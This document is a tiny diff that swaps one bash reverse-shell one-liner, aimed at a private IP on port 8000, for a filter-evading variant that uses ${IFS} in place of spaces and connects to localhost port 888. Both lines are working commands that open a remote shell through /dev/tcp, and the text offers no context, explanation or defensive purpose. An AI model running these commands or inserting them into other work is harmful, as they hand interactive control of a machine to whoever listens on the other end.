@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/10.200.100.249/8000 0>&1
+/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/127.0.0.1/888<&1
